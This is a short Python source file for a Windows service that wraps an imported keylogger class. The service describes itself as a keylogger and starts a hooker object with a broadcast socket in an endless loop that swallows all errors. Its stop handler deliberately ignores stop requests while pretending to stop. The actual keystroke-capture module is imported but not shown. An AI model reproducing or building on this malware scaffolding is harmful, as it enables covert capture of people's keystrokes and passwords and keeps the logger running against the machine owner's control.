# =================================
#    Hotel Kilo Windows Service
# =================================
import win32serviceutil
import win32service
import win32event
import sys

from HotelKilo import HookerKilo
sys.stopdriver = 'false'

class ServiceLauncher(win32serviceutil.ServiceFramework):
    
    _svc_name_ = 'hotelService'
    _svc_description_ = 'Key logs your ass.'
    _scv_display_name_ = 'Hotel Service'
        
    def __init__(self, args):
        ''' Service Constructor '''
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        
    def SvcStop(self):
        ''' Displays service as 'stopping' (don't worry it won't) '''
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        pass # Just keep going, ignore request
 
    def SvcDoRun(self):
        ''' Creates an instance of the hooker class '''
        while True:
            try:
                hk = HookerKilo()
                hk.createBroadcastSocket()
                hk.start()
            except:
                pass